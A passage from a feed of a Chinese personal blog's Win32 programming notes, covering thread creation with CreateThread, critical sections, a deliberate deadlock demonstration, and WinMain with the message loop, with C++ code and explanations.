class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个线程函数步骤如下</p><ol><li>文本框中取值</li><li>字符串 -&gt; 数字</li><li>数字自加1</li><li>数字 -&gt; 字符串</li><li>放回文本框中</li></ol></li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>  ​        在windows系统中，一个线程使用一个CUP,但是电脑中的CPU有限，而电脑中又有很多进程，每一个进程中又存在很多线程，所以开发人员在设计的时候规定每一个线程使用CPU的时间为20ms，当一个线程20ms的时间用尽，只有等待下次为他分配时间时才可以继续工作。所以当两个线程同时操作一个全局变量时就会出现问题。</p><p>  <img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105194833216.png" style="zoom: 67%;" /><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105195059526.png"></p><h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><p>​        Windows设计出了临界区来解决线程抢占资源的问题</p><p>​        当多个设计程序多个线程都涉及到某个全局变量时，可以使用临界区来解决这个问题，临界区可以理解为给这个全局变量假定了一个令牌，这个令牌在程序中只有个块，只有拿到令牌的人才可以对全局变量进行操作。</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105203720477.png" style="zoom:67%;" /><p>​        将上面的线程函数做如下下修改，就可以解决多线程使用同一个全局变量的问题。</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105204003677.png" style="zoom:80%;" /><h4 id="临界区结构体部分成员解释"><a href="#临界区结构体部分成员解释" class="headerlink" title="临界区结构体部分成员解释"></a>临界区结构体部分成员解释</h4><p>结构体定义如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//  The following three fields control entering and exiting the critical</span></span><br><span class="line">    <span class="comment">//  section for the resource</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    LONG LockCount;</span><br><span class="line">    LONG RecursionCount;</span><br><span class="line">    HANDLE OwningThread;        <span class="comment">// from the thread&#x27;s ClientId-&gt;UniqueThread</span></span><br><span class="line">    HANDLE LockSemaphore;</span><br><span class="line">    ULONG_PTR SpinCount;        <span class="comment">// force size on 64-bit systems when packed</span></span><br><span class="line">&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;</span><br></pre></td></tr></table></figure><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105204447624.png" style="zoom:80%;" /><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>​        临界区使用不当可能会造成死锁，当定义两个锁及以上使用需要格外小心，否则程序就可能造成死锁。下图就是死锁的基本原理，当使用临界区时，应该尽量注意将使用锁的使用顺序，经量将锁的使用顺序变成一样的。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201105210326244.png"></p><h4 id="试写死锁程序"><a href="#试写死锁程序" class="headerlink" title="试写死锁程序"></a>试写死锁程序</h4><p>​         死锁程序没有任何作用，但是可以加深对临界区的理解，且所谓的死锁程序只是逻辑上的，当写出来后也不一定会立刻生效。</p><ul><li><p>线程1代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;cs1);<span class="comment">//锁1</span></span><br><span class="line">***********容易产生死锁的位置***********</span><br><span class="line">EnterCriticalSection(&amp;cs2);<span class="comment">//锁2</span></span><br><span class="line"></span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line">LeaveCriticalSection(&amp;cs2);</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>线程2代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;cs2);<span class="comment">//锁2</span></span><br><span class="line">***********容易产生死锁的位置***********</span><br><span class="line">EnterCriticalSection(&amp;cs1);<span class="comment">//锁1</span></span><br><span class="line"></span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs1);</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;多线程之间的资源抢占问题&quot;&gt;&lt;a href=&quot;#多线程之间的资源抢占问题&quot; class=&quot;headerlink&quot; title=&quot;多线程之间的资源抢占问题&quot;&gt;&lt;/a&gt;多线程之间的资源抢占问题&lt;/h3&gt;&lt;p&gt;​        当多</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="线程" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>🎦Win32学习记录-2(创建线程)</title>
    <link href="http://example.com/2020/11/02/windows/Win32-2/"/>
    <id>http://example.com/2020/11/02/windows/Win32-2/</id>
    <published>2020-11-02T15:05:23.683Z</published>
    <updated>2021-02-05T06:29:33.979Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>✈✈图形化界面创建过程略过✈✈</p><h3 id="CreateThread函数介绍"><a href="#CreateThread函数介绍" class="headerlink" title="CreateThread函数介绍"></a>CreateThread函数介绍</h3><ul><li><p>MSDN对CreateThread的解释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                 lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>中文版</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 安全属性 通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwStackSize,                       <span class="comment">// 参数用于设定线程可以将多少地址空间用于它自己的堆栈</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// 每个线程拥有它自己的堆栈</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// 参数用于指明想要新线程执行的线程函数的地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpParameter,                       <span class="comment">// 线程函数的参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// 在线程启动执行时将该参数传递给线程函数</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// 既可以是数字，也可以是指向包含其他信息的一个数据结构的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCreationFlags,                    <span class="comment">// 0 创建完毕立即调度  CREATE_SUSPENDED创建后挂起</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpThreadId                        <span class="comment">// 线程ID </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">// 返回值：线程句柄</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="界面资源介绍"><a href="#界面资源介绍" class="headerlink" title="界面资源介绍"></a>界面资源介绍</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201102222253640.png"></p><h3 id="WinMain函数"><a href="#WinMain函数" class="headerlink" title="WinMain函数"></a>WinMain函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> nCmdShow</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), <span class="literal">NULL</span>, DiaLogProc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DiaLogProc函数（消息回调函数）"><a href="#DiaLogProc函数（消息回调函数）" class="headerlink" title="DiaLogProc函数（消息回调函数）"></a>DiaLogProc函数（消息回调函数）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL CALLBACK <span class="title">DiaLogProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hwndDlg,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,</span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_INITDIALOG:</span><br><span class="line">&#123;</span><br><span class="line">            ********************************获得两个窗口句柄***************************</span><br><span class="line">hEDIT_ONE = GetDlgItem(hwndDlg, IDC_EDIT_ONE);</span><br><span class="line">hEDIT_TWO = GetDlgItem(hwndDlg, IDC_EDIT_TWO);</span><br><span class="line">            ************************************************************************</span><br><span class="line">            </span><br><span class="line">            ********************************初始化窗口********************************</span><br><span class="line">SetWindowText(hEDIT_ONE, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">SetWindowText(hEDIT_TWO, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">            ************************************************************************</span><br><span class="line">                </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IDC_BUTTON:</span><br><span class="line">&#123;</span><br><span class="line">                    </span><br><span class="line">                    *****************************创建了两个线程*****************************</span><br><span class="line">HANDLE hThread1 = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                    **********************************************************************</span><br><span class="line">                        </span><br><span class="line">::CloseHandle(hThread1);</span><br><span class="line">::CloseHandle(hThread2);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">DestroyWindow(hwndDlg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwndDlg, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线程函数1"><a href="#线程函数1" class="headerlink" title="线程函数1"></a>线程函数1</h3><p><strong>注意这里直接将返回值(线程句柄)设置为0</strong>，另外一个线程函数与这个相似，不在贴出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpParameter</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//将文本框中的输入传入Buffer中</span></span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">GetWindowText(hEDIT_ONE, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="comment">//将Buffer中的字符串转为数字</span></span><br><span class="line">DWORD dwTimer;</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwTimer);</span><br><span class="line"><span class="keyword">while</span> (dwTimer &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//在将数字减1后变为字符串</span></span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>((<span class="keyword">char</span>*)szBuffer, <span class="string">&quot;%d&quot;</span>, --dwTimer);</span><br><span class="line"><span class="comment">//将字符串放回到文本框中</span></span><br><span class="line">SetWindowText(hEDIT_ONE, szBuffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201102230457022.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;✈✈图形化界面创建过程略过✈✈&lt;/p&gt;
&lt;h3 id=&quot;CreateThread函数介绍&quot;&gt;&lt;a href=&quot;#CreateThread函数介绍&quot; class=&quot;headerlink&quot; title=&quot;CreateThread函数介绍&quot;&gt;</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="线程" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>🎦Win32学习记录(注册-创建窗口)-1</title>
    <link href="http://example.com/2020/10/29/windows/Win32-1/"/>
    <id>http://example.com/2020/10/29/windows/Win32-1/</id>
    <published>2020-10-29T15:59:34.213Z</published>
    <updated>2021-02-05T06:29:17.184Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="WIn32窗口应用程序主函数-WinMain"><a href="#WIn32窗口应用程序主函数-WinMain" class="headerlink" title="WIn32窗口应用程序主函数:WinMain()"></a>WIn32窗口应用程序主函数:WinMain()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCmdShow</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>这是在Windows下编写的程序入口，下面对参数逐个解释</p><h4 id="hInstance"><a href="#hInstance" class="headerlink" title="hInstance"></a>hInstance</h4><ul><li>hInstance是应用程序的实例句柄。这里的实例句柄是程序装入内存后的起始地址。</li><li>通过GetModuleHandle() 参数来获得。</li></ul><h4 id="hPrevInstance"><a href="#hPrevInstance" class="headerlink" title="hPrevInstance"></a>hPrevInstance</h4><ul><li>同一个文件创建的上一个实例句柄。这个参数在Win32下已经不再使用。</li></ul><h4 id="lpCmdLine"><a href="#lpCmdLine" class="headerlink" title="lpCmdLine"></a>lpCmdLine</h4><ul><li><p>主函数的参数，用于在程序启动时给进程传递参数</p><p>点击开始，打开运行窗口，输入”notepad C:\boot.ini”，这个命令的作用为将存储在C盘目录下的book.ini文件用记事本方式打开，点击确定，记事本弹出，由于我的C盘目录下没有这个文件，所以提示文件不存在。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201029213610750.png" alt="" style="zoom: 67%;" />     <img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201029213702148.png" alt="" style="zoom:50%;" />   </p></li></ul><h4 id="nCmdShow"><a href="#nCmdShow" class="headerlink" title="nCmdShow"></a>nCmdShow</h4><ul><li>表示进程显示方式，可以为最大化，最小化，隐藏等显示方式。</li></ul><h3 id="WinMain中函数流程"><a href="#WinMain中函数流程" class="headerlink" title="WinMain中函数流程"></a>WinMain中函数流程</h3><h4 id="注册窗口类"><a href="#注册窗口类" class="headerlink" title="注册窗口类"></a>注册窗口类</h4><p>编写Windows程序，WinMain()函数的主要任务是注册一个窗口类，创建一个窗口并显示创建的窗口，在不停的获取属于自己的消息并分发给自己的窗口。知道接受到WM_QUIT消息后退出循环结束进程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">                     HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">                     LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// <span class="doctag">TODO:</span> Place code here.</span></span><br><span class="line">MSG Msg;</span><br><span class="line">BOOL bRet;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册窗口类</span></span><br><span class="line">MyRegisterClass(hInstance);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建窗口并显示窗口</span></span><br><span class="line"><span class="keyword">if</span>(!InitInstance(hInstance, SW_SHOWNORMAL))</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息循环</span></span><br><span class="line"><span class="comment">//获取属于自己的消息并进行分发</span></span><br><span class="line"><span class="keyword">while</span>( (bRet = GetMessage(&amp;Msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(bRet == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//handle the error and possibly exit</span></span><br><span class="line"><span class="comment">//句柄错误强制退出</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;Msg);</span><br><span class="line">DispatchMessage(&amp;Msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对部分函数的作用进行解释</p><h5 id="GetMessage"><a href="#GetMessage" class="headerlink" title="GetMessage"></a>GetMessage</h5><p>MSDN对于该函数参数的解释</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPMSG lpMsg,         <span class="comment">// message information</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWnd,           <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT wMsgFilterMin,  <span class="comment">// first message</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT wMsgFilterMax   <span class="comment">// last message</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数用来获取属于自己的消息，并填充MSG结构体</p><h5 id="TranslateMessage"><a href="#TranslateMessage" class="headerlink" title="TranslateMessage"></a>TranslateMessage</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">TranslateMessage</span><span 